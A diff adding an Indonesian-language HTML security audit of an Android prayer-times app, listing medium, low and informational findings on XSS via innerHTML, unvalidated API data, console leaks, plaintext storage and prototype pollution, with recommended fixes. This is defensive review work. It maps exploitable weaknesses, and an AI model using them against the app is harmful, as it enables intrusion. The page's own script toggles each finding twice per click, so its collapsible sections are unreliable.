+      <strong>Rekomendasi Perbaikan</strong>
+      Hapus inline onclick dan ganti dengan <code>addEventListener</code>:
+      <pre style="margin-top:8px">
+// Di empty-state.js, hapus onclick prop atau gunakan data attribute:
+// Setelah render, bind event:
+container.querySelector('.empty-state__btn--secondary')
+    ?.addEventListener('click', () => showLocationSearchModal({...}));</pre>
+    </div>
+  </div>
+</div>
+
+<!-- M-2 -->
+<div class="finding" id="M2">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge med">SEDANG</span>
+    <span class="finding-title">M-2 · Inline Event Handler di Empty State Component</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/components/ui/empty-state.js</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Komponen <code>renderEmptyState()</code> menerima <code>action.onclick</code> sebagai string yang dimasukkan langsung ke atribut <code>onclick</code> HTML. Ini adalah pola yang sangat berbahaya.</p>
+    <pre>
+// empty-state.js
+export function renderEmptyState({ ..., action, secondaryAction }) {
+    return `
+        &lt;button ...${action.onclick ? ` onclick="${action.onclick}"` : ''}&gt;
+    `;
+}
+
+// Caller dari home-page.js:
+action: {
+    label: t('retry'),
+    icon: 'bx-refresh',
+    onclick: 'location.reload()',  // ← string hardcoded, saat ini aman
+},
+secondaryAction: {
+    onclick: '_homeShowManualSearch()',  // ← bergantung pada global function
+},</pre>
+    <h3>Masalah</h3>
+    <ul>
+      <li>Pola menerima string sebagai event handler sangat rentan jika <code>action.onclick</code> pernah berasal dari input pengguna atau data eksternal</li>
+      <li>Bertentangan dengan CSP yang baik (membutuhkan <code>'unsafe-inline'</code>)</li>
+      <li>Bisa dieksploitasi jika ada path code yang tidak terduga mengisi <code>onclick</code> dengan data dinamis</li>
+    </ul>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Ganti model onclick-string dengan callback function. Render button tanpa onclick, kemudian bind event secara programatik setelah rendering selesai.
+    </div>
+  </div>
+</div>
+
+<!-- M-3 -->
+<div class="finding" id="M3">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge med">SEDANG</span>
+    <span class="finding-title">M-3 · Tidak Ada Validasi Integritas Konten Response API</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/core/api.js — <code>isValidResponse()</code>, <code>isValidMonthlyResponse()</code></span>
+      <span><strong>CWE:</strong> CWE-20 (Improper Input Validation)</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Validasi API hanya memeriksa struktur/keberadaan field, tidak memeriksa apakah nilai waktu sholat berada dalam rentang yang masuk akal:</p>
+    <pre>
+function isValidResponse(data) {
+    if (data?.code !== 200 || !data?.data?.timings) return false;
+    const timings = data.data.timings;
+    return REQUIRED_KEYS.every(key =>
+        typeof timings[key] === 'string' && timings[key].length > 0
+        // ← tidak ada range check! "99:99" atau "&lt;script&gt;" lolos validasi ini
+    );
+}</pre>
+    <h3>Dampak</h3>
+    <ul>
+      <li>API yang dikompromikan dapat mengirim string waktu yang tidak valid namun lolos validasi</li>
+      <li>String berbahaya seperti HTML/JS bisa lolos masuk ke state aplikasi lalu dirender</li>
+      <li>Nilai waktu yang ekstrem (imsak = 01:00, isya = 23:59) bisa menyesatkan pengguna tanpa terdeteksi</li>
+    </ul>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Tambahkan validasi format dan range:
+      <pre style="margin-top:8px">
+function isValidTimeString(str) {
+    if (typeof str !== 'string') return false;
+    const clean = str.replace(/\s*\(.*\)/, '').trim();
+    const match = clean.match(/^(\d{1,2}):(\d{2})$/);
+    if (!match) return false;
+    const h = parseInt(match[1]), m = parseInt(match[2]);
+    return h >= 0 && h <= 23 && m >= 0 && m <= 59;
+}
+// Terapkan ke setiap key di validasi response</pre>
+    </div>
+  </div>
+</div>
+
+<!-- M-4 -->
+<div class="finding" id="M4">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge med">SEDANG</span>
+    <span class="finding-title">M-4 · Debug Information Bocor ke Console di Production Build</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> Tersebar di hampir semua file JS (api.js, app.js, store.js, compass.js, dll)</span>
+      <span><strong>CWE:</strong> CWE-532 (Insertion of Sensitive Information into Log File)</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Ratusan statement <code>console.log()</code>, <code>console.warn()</code>, dan <code>console.error()</code> tersebar di seluruh kode. Pada build production di Android, log ini bisa dibaca menggunakan <code>adb logcat</code> tanpa root.</p>
+    <pre>
+// api.js — mengekspos URL mirror internal:
+console.log(`[API] Qibla direction: ${direction}° via ${mirror}`);
+console.warn(`[API] Mirror failed: ${mirror} — ${err.message}`);
+
+// store.js — mengekspos struktur state:
+// (tidak langsung, tapi error object bisa mengandung data state)
+
+// compass.js:
+console.log(`[Compass] Declination (${latitude}, ${longitude}): ${dec}°`);
+
+// app.js:
+console.log('[App] Back handler initialized');
+console.log('[App] Resumed — syncing 30-day notifications');</pre>
+    <h3>Dampak</h3>
+    <ul>
+      <li>Penyerang dengan USB access bisa memonitor seluruh aktivitas aplikasi via <code>adb logcat</code></li>
+      <li>Mengekspos arsitektur internal, URL API, dan informasi sensitif lainnya</li>
+      <li>Ini juga bisa mempengaruhi evaluasi aplikasi di Play Store (Google kadang memeriksa log)</li>
+    </ul>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Gunakan konfigurasi Vite untuk menghapus console.log di production:
+      <pre style="margin-top:8px">
+// vite.config.js
+export default defineConfig({
+    build: {
+        minify: 'terser',
+        terserOptions: {
+            compress: {
+                drop_console: true,   // hapus semua console.*
+                drop_debugger: true,
+            }
+        }
+    }
+});</pre>
+    </div>
+  </div>
+</div>
+
+<!-- M-5 -->
+<div class="finding" id="M5">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge med">SEDANG</span>
+    <span class="finding-title">M-5 · Data Storage Tidak Terenkripsi & Tidak Ada Integrity Check</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/core/storage.js, src/js/core/store.js</span>
+      <span><strong>CWE:</strong> CWE-312 (Cleartext Storage of Sensitive Information)</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>State aplikasi (termasuk lokasi GPS pengguna, preset Ramadhan kustom, preferensi) disimpan sebagai JSON plaintext di Capacitor Preferences (SharedPreferences pada Android). Tidak ada enkripsi atau HMAC untuk integritas data.</p>
+    <pre>
+// storage.js — disimpan sebagai JSON plaintext
+export async function set(key, value) {
+    await Preferences.set({
+        key: PREFIX + key,
+        value: JSON.stringify(value),  // ← plaintext, tidak ada enkripsi/signing
+    });
+}</pre>
+    <h3>Dampak</h3>
+    <ul>
+      <li>Di perangkat rooted, semua data dapat dibaca dan dimanipulasi tanpa enkripsi</li>
+      <li>Manipulasi data storage bisa menyebabkan Prototype Pollution (C-1) atau XSS (C-3)</li>
+      <li>Lokasi GPS pengguna tersimpan plaintext dan bisa diakses oleh aplikasi lain dengan root</li>
+    </ul>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Untuk data sensitif (lokasi), gunakan CapacitorSecurePreferences atau Android Keystore-backed encrypted storage. Tambahkan HMAC untuk mendeteksi tampering pada state kritis. Minimal, validasi semua data yang dimuat dari storage sebelum digunakan.
+    </div>
+  </div>
+</div>
+
+<!-- M-6 -->
+<div class="finding" id="M6">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge med">SEDANG</span>
+    <span class="finding-title">M-6 · Tidak Ada Sanitasi pada Nilai Waktu Sebelum Dirender ke DOM</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/components/card/prayer-card.js, schedule-card.js, prayer-list.js</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>String waktu sholat dari API dirender langsung ke template innerHTML. Fungsi <code>cleanTime()</code> hanya menghapus timezone suffix, tidak melakukan sanitasi HTML.</p>
+    <pre>
+// prayer-card.js — renderSingleTube()
+`&lt;div class="tube__time"&gt;${cleanTime(time)}&lt;/div&gt;`   // ← innerHTML dengan data API
+
+// cleanTime() hanya:
+function cleanTime(timeStr) {
+    return timeStr.replace(/\s*\(.*\)/, '');  // ← hanya buang timezone, tidak escape HTML
+}</pre>
+    <h3>Dampak</h3>
+    <p>Jika API mengembalikan nilai waktu yang mengandung HTML (karena dikompromikan atau bug), nilai tersebut akan dieksekusi sebagai HTML di DOM.</p>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Setelah <code>cleanTime()</code>, tambahkan validasi format waktu (hanya izinkan string yang cocok dengan <code>/^\d{2}:\d{2}$/</code>) dan escaping sebelum masuk ke template.
+    </div>
+  </div>
+</div>
+
+<!-- M-7 -->
+<div class="finding" id="M7">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge med">SEDANG</span>
+    <span class="finding-title">M-7 · Confirm Modal Menerima HTML di Parameter title dan message</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/components/modal/confirm-modal.js — <code>createModalDOM()</code></span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Confirm modal merender <code>title</code> dan <code>message</code> via innerHTML. Karena translation string i18next mengandung HTML literal (<code>&lt;strong&gt;</code>), ini desain yang disengaja, namun membuka celah jika nilai interpolasi tidak di-escape dengan benar.</p>
+    <pre>
+// confirm-modal.js
+overlay.innerHTML = `
+    &lt;div class="confirm-dialog"&gt;
+        &lt;h3 class="confirm-title"&gt;${title}&lt;/h3&gt;     // ← innerHTML
+        &lt;p class="confirm-message"&gt;${message}&lt;/p&gt;   // ← innerHTML dengan HTML dari i18n
+    &lt;/div&gt;
+`;
+
+// Contoh translation yang mengandung HTML:
+"reset_confirm_msg": "...restore &lt;strong&gt;{{presetName}}&lt;/strong&gt;..."
+// i18next dengan escapeValue:true men-escape presetName — AMAN
+// TAPI: jika ada caller yang melewati message tanpa melalui i18next:
+showConfirmModal({ message: userData.something })  // ← berpotensi XSS</pre>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Buat dua versi parameter: <code>messageHtml</code> (untuk terjemahan yang mengandung HTML, harus dari i18next saja) dan <code>messageText</code> (untuk teks biasa, gunakan textContent). Atau gunakan DOMParser untuk mengizinkan subset HTML yang terbatas.
+    </div>
+  </div>
+</div>
+
+<!-- M-8 -->
+<div class="finding" id="M8">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge med">SEDANG</span>
+    <span class="finding-title">M-8 · Penggunaan for...in Tanpa hasOwnProperty di Beberapa Lokasi</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/core/store.js dan beberapa utilitas</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Selain masalah prototype pollution di C-1, penggunaan <code>for...in</code> tanpa pemeriksaan <code>hasOwnProperty</code> atau <code>Object.hasOwn()</code> bisa menyebabkan iterasi ke properti yang diwarisi dari prototype jika prototype pollution sudah terjadi.</p>
+    <pre>
+// store.js
+for (const key in source) {
+    // Tanpa: if (!Object.hasOwn(source, key)) continue;
+    // ← Jika prototype sudah ter-polute, properti inherited ikut diiterasi
+}</pre>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Gunakan <code>Object.keys(source)</code> atau tambahkan <code>if (!Object.hasOwn(source, key)) continue;</code> di awal setiap <code>for...in</code> loop.
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<h2 id="low">🟢 Kerentanan Rendah (Low)</h2>
+<p class="section-intro">Risiko rendah dalam kondisi normal namun perlu diperbaiki untuk praktik keamanan yang baik.</p>
+
+<!-- L-1 -->
+<div class="finding" id="L1">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge low">RENDAH</span>
+    <span class="finding-title">L-1 · Error Messages Mengekspos Detail Internal ke Console</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/core/api.js</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <pre>
+throw new AggregateError(
+    errors.map(e => new Error(e.error)),
+    `All ${mirrors.length} API mirrors failed`  // ← ekspos jumlah mirror
+);
+// Dan setiap error message dari mirror:
+console.warn(`[API] Mirror failed: ${mirror} — ${err.message}`);</pre>
+    <p>Pesan error mengandung URL mirror, jumlah mirror, dan detail HTTP error yang berguna bagi penyerang untuk memetakan infrastruktur API.</p>
+    <div class="fix-box"><strong>Rekomendasi Perbaikan</strong> Hapus detail teknis dari error messages di production build. Log ke internal error tracking, bukan console.</div>
+  </div>
+</div>
+
+<!-- L-2 -->
+<div class="finding" id="L2">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge low">RENDAH</span>
+    <span class="finding-title">L-2 · sessionStorage Digunakan untuk State Kritis di WebView</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/modules/network/offline-updater.js</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <pre>
+sessionStorage.setItem(SESSION_DISMISS_KEY, 'true');
+if (sessionStorage.getItem(SESSION_DISMISS_KEY) === 'true') return;</pre>
+    <p>sessionStorage bisa dibaca/dimodifikasi oleh script yang berjalan di konteks yang sama. Jika ada XSS, penyerang bisa memanipulasi state ini. Juga, dalam beberapa konfigurasi WebView, sessionStorage bisa persisten di luar ekspektasi.</p>
+    <div class="fix-box"><strong>Rekomendasi Perbaikan</strong> Gunakan variabel in-memory untuk state session yang bersifat sementara, atau gunakan Capacitor Preferences untuk state yang lebih persisten dan terkontrol.</div>
+  </div>
+</div>
+
+<!-- L-3 -->
+<div class="finding" id="L3">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge low">RENDAH</span>
+    <span class="finding-title">L-3 · Tidak Ada Timeout/Rate Limiting untuk Operasi GPS</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/core/geolocation.js — <code>detectLocation()</code></span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Tidak ada batasan berapa kali fungsi GPS dapat dipanggil dalam periode waktu tertentu. Ini bisa dieksploitasi untuk resource exhaustion (battery drain attack via XSS atau bug) atau untuk fingerprinting lokasi pengguna secara berulang.</p>
+    <pre>
+// detectLocation() bisa dipanggil berkali-kali tanpa batasan
+// Tidak ada rate limiting, cooldown, atau circuit breaker</pre>
+    <div class="fix-box"><strong>Rekomendasi Perbaikan</strong> Tambahkan cooldown minimal (misalnya 5 menit) antara request GPS, dan cache hasil terakhir.</div>
+  </div>
+</div>
+
+<!-- L-4 -->
+<div class="finding" id="L4">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge low">RENDAH</span>
+    <span class="finding-title">L-4 · File Write ke Cache Directory Tanpa Validasi Nama File</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> src/js/modules/share/share-schedule-exporter.js</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <pre>
+const fileName = `${getDefaultFilename()}-${Date.now()}.png`;
+await Filesystem.writeFile({
+    path: fileName,       // ← nama file dari template string
+    data: base64Data,
+    directory: Directory.Cache,
+});</pre>
+    <p>Meskipun saat ini <code>getDefaultFilename()</code> mengembalikan string hardcoded, pola menggunakan template string untuk nama file bisa berbahaya jika fungsi tersebut pernah mengembalikan nilai yang dikontrol pengguna (misalnya jika lokasi dimasukkan ke nama file).</p>
+    <div class="fix-box"><strong>Rekomendasi Perbaikan</strong> Sanitasi nama file dengan hanya mengizinkan karakter alphanumeric, dash, dan underscore: <code>fileName.replace(/[^a-z0-9\-_]/gi, '')</code>.</div>
+  </div>
+</div>
+
+<!-- L-5 -->
+<div class="finding" id="L5">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge low">RENDAH</span>
+    <span class="finding-title">L-5 · Ketergantungan NPM Tidak Diaudit — Potensi Supply Chain Attack</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> package.json (tidak diberikan untuk dianalisis)</span>
+      <span><strong>CWE:</strong> CWE-1395 (Dependency on Vulnerable Third-Party Component)</span>
+    </div>
+    <h3>Deskripsi</h3>
+    <p>Aplikasi menggunakan banyak dependensi pihak ketiga: Leaflet, panzoom, page-flip, html-to-image, adhan, geomagnetism, i18next, dan kapasitor plugins. Tanpa audit rutin, dependensi yang dikompromikan bisa menyisipkan kode berbahaya.</p>
+    <div class="fix-box">
+      <strong>Rekomendasi Perbaikan</strong>
+      Jalankan <code>npm audit</code> dan fix semua vulnerability yang ditemukan. Pertimbangkan menggunakan <code>npm audit --audit-level=high</code> di CI/CD pipeline. Gunakan <code>npm ci</code> (bukan <code>npm install</code>) di build production untuk memastikan versi terkunci di <code>package-lock.json</code>.
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<h2 id="informational">🔵 Informatif</h2>
+<p class="section-intro">Bukan kerentanan langsung, namun praktik yang perlu diperhatikan untuk keamanan jangka panjang.</p>
+
+<!-- I-1 -->
+<div class="finding" id="I1">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge info">INFO</span>
+    <span class="finding-title">I-1 · Tidak Ada Pemisahan antara Data Trusted dan Untrusted di State Management</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <h3>Deskripsi</h3>
+    <p>Store aplikasi menggabungkan semua data dalam satu objek state tanpa membedakan mana data yang berasal dari sumber terpercaya (hardcoded, i18n) dan mana yang tidak (API eksternal, input pengguna). Ini membuat sanitasi yang konsisten lebih sulit.</p>
+    <div class="fix-box"><strong>Rekomendasi</strong> Pertimbangkan menandai data di state dengan origin-nya, atau membuat konvensi bahwa semua data yang ditampilkan ke DOM HARUS melalui fungsi sanitasi terlepas dari sumbernya.</div>
+  </div>
+</div>
+
+<!-- I-2 -->
+<div class="finding" id="I2">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge info">INFO</span>
+    <span class="finding-title">I-2 · Inkonsistensi Penggunaan textContent vs innerHTML di Kodebase</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <h3>Deskripsi</h3>
+    <p>Kodebase sangat inkonsisten dalam penggunaan <code>textContent</code> (aman) vs <code>innerHTML</code> (berpotensi berbahaya). Sebagian lokasi sudah benar menggunakan <code>textContent</code>, sementara sebagian besar template string menggunakan <code>innerHTML</code>.</p>
+    <pre>
+// AMAN — sudah benar di beberapa tempat:
+arabicEl.textContent = ayah.arabic;           // quran-reader.js
+translationEl.textContent = ayah.translation; // quran-reader.js
+nameEl.textContent = preset.name;             // beberapa tempat
+
+// TIDAK AMAN — pola dominan:
+container.innerHTML = `...${externalData}...`;  // mayoritas komponen</pre>
+    <div class="fix-box"><strong>Rekomendasi</strong> Buat panduan internal: "Gunakan textContent/createElement by default. innerHTML HANYA untuk konten yang sudah diverifikasi aman (misalnya dari i18next yang sudah di-escape, atau HTML hardcoded). SELALU gunakan escapeHtml() untuk data dinamis di innerHTML."</div>
+  </div>
+</div>
+
+<!-- I-3 -->
+<div class="finding" id="I3">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge info">INFO</span>
+    <span class="finding-title">I-3 · Capacitor WebView — Konfigurasi Keamanan Native Perlu Diverifikasi</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <h3>Deskripsi</h3>
+    <p>Keamanan aplikasi Capacitor juga bergantung pada konfigurasi Android native yang tidak terlihat dalam kode yang diberikan. Beberapa hal yang perlu diverifikasi:</p>
+    <ul>
+      <li><code>android:allowBackup="false"</code> di AndroidManifest.xml — jika true, data aplikasi bisa di-backup oleh penyerang</li>
+      <li><code>android:debuggable="false"</code> di build release — jika true, WebView bisa di-inspect via Chrome DevTools</li>
+      <li>Konfigurasi <code>setMixedContentMode</code> di WebView — jangan izinkan mixed content</li>
+      <li>Network Security Config untuk certificate pinning — tidak ada bukti pinning di kode yang diberikan</li>
+      <li><code>android:usesCleartextTraffic="false"</code> — semua traffic harus HTTPS</li>
+    </ul>
+    <div class="fix-box"><strong>Rekomendasi</strong> Audit <code>AndroidManifest.xml</code>, <code>capacitor.config.ts</code>, dan <code>android/app/src/main/res/xml/network_security_config.xml</code> untuk memastikan konfigurasi native sudah aman.</div>
+  </div>
+</div>
+
+<!-- I-4 -->
+<div class="finding" id="I4">
+  <div class="finding-header" onclick="toggle(this)">
+    <span class="badge info">INFO</span>
+    <span class="finding-title">I-4 · Tidak Ada Mekanisme Deteksi Tampering / Root Detection</span>
+    <span class="finding-toggle">▼</span>
+  </div>
+  <div class="finding-body">
+    <h3>Deskripsi</h3>
+    <p>Aplikasi tidak memiliki mekanisme untuk mendeteksi apakah berjalan di perangkat yang di-root atau di emulator. Di perangkat yang di-root, banyak perlindungan keamanan (SharedPreferences isolation, dll) bisa dilewati.</p>
+    <div class="fix-box"><strong>Rekomendasi</strong> Pertimbangkan integrasi library seperti <a href="https://github.com/scottyab/rootbeer">RootBeer</a> (Android) untuk deteksi root. Untuk Play Store, pertimbangkan mengintegrasikan Google Play Integrity API untuk memverifikasi integritas perangkat dan aplikasi.</div>
+  </div>
+</div>
+
+<!-- Summary -->
+<h2>📋 Ringkasan Prioritas Perbaikan</h2>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:24px">
+  <p style="margin-bottom:16px;font-size:14px;color:var(--muted)">Urutan perbaikan yang direkomendasikan sebelum release ke Play Store:</p>
+  <table style="width:100%;border-collapse:collapse;font-size:13px">
+    <thead>
+      <tr style="border-bottom:1px solid var(--border)">
+        <th style="text-align:left;padding:8px 10px;color:var(--muted);font-weight:500">Prioritas</th>
+        <th style="text-align:left;padding:8px 10px;color:var(--muted);font-weight:500">Tindakan</th>
+        <th style="text-align:left;padding:8px 10px;color:var(--muted);font-weight:500">Effort</th>
+        <th style="text-align:left;padding:8px 10px;color:var(--muted);font-weight:500">ID</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:8px 10px"><span class="badge crit" style="font-size:10px">1</span></td>
+        <td style="padding:8px 10px">Buat fungsi <code>escapeHtml()</code> dan terapkan ke SEMUA data yang dirender via innerHTML</td>
+        <td style="padding:8px 10px;color:var(--muted)">Sedang</td>
+        <td style="padding:8px 10px;color:var(--muted)">C-3, H-1~H-6, M-6</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:8px 10px"><span class="badge crit" style="font-size:10px">2</span></td>
+        <td style="padding:8px 10px">Perbaiki <code>_mergeConfig()</code> dengan menambahkan guard untuk <code>__proto__</code></td>
+        <td style="padding:8px 10px;color:var(--muted)">Rendah</td>
+        <td style="padding:8px 10px;color:var(--muted)">C-1, M-8</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:8px 10px"><span class="badge crit" style="font-size:10px">3</span></td>
+        <td style="padding:8px 10px">Hapus <code>'unsafe-inline'</code>/<code>'unsafe-eval'</code> dari CSP, ganti inline onclick dengan addEventListener</td>
+        <td style="padding:8px 10px;color:var(--muted)">Tinggi</td>
+        <td style="padding:8px 10px;color:var(--muted)">C-2, M-1, M-2</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:8px 10px"><span class="badge high" style="font-size:10px">4</span></td>
+        <td style="padding:8px 10px">Hapus API mirror alislam.ru, tambahkan validasi range waktu sholat</td>
+        <td style="padding:8px 10px;color:var(--muted)">Rendah</td>
+        <td style="padding:8px 10px;color:var(--muted)">H-7, M-3</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:8px 10px"><span class="badge high" style="font-size:10px">5</span></td>
+        <td style="padding:8px 10px">Konfigurasi Vite untuk menghapus console.* di production build</td>
+        <td style="padding:8px 10px;color:var(--muted)">Rendah</td>
+        <td style="padding:8px 10px;color:var(--muted)">M-4</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:8px 10px"><span class="badge med" style="font-size:10px">6</span></td>
+        <td style="padding:8px 10px">Audit AndroidManifest.xml dan konfigurasi Capacitor native</td>
+        <td style="padding:8px 10px;color:var(--muted)">Rendah</td>
+        <td style="padding:8px 10px;color:var(--muted)">I-3</td>
+      </tr>
+      <tr>
+        <td style="padding:8px 10px"><span class="badge low" style="font-size:10px">7</span></td>
+        <td style="padding:8px 10px">Jalankan <code>npm audit</code> dan fix dependensi yang rentan</td>
+        <td style="padding:8px 10px;color:var(--muted)">Bervariasi</td>
+        <td style="padding:8px 10px;color:var(--muted)">L-5</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div style="background:var(--info-bg);border:1px solid var(--info-border);border-radius:var(--radius);padding:16px 20px;font-size:13px;color:var(--muted)">
+  <strong style="color:var(--info);display:block;margin-bottom:6px">Temuan Utama</strong>
+  Kerentanan paling kritis di aplikasi ini adalah <strong>tidak adanya escaping HTML yang konsisten</strong> ketika merender data dari sumber eksternal (API, input pengguna) ke DOM via <code>innerHTML</code>. Ini adalah pola yang tersebar sangat luas di kodebase. Solusi sistemiknya adalah membuat satu fungsi <code>escapeHtml()</code> terpusat dan menerapkannya secara konsisten, serta beralih ke pola <code>createElement/textContent</code> sebisa mungkin. Setelah itu diperbaiki, mayoritas kerentanan XSS (C-3, H-1 s/d H-6) akan terselesaikan sekaligus.
+</div>
+
+<script>
+function toggle(header) {
+  const finding = header.closest('.finding');
+  finding.classList.toggle('open');
+}
+document.querySelectorAll('.finding-header').forEach(h => {
+  h.addEventListener('click', () => toggle(h));
+});
+</script>
+</body>
+</html>
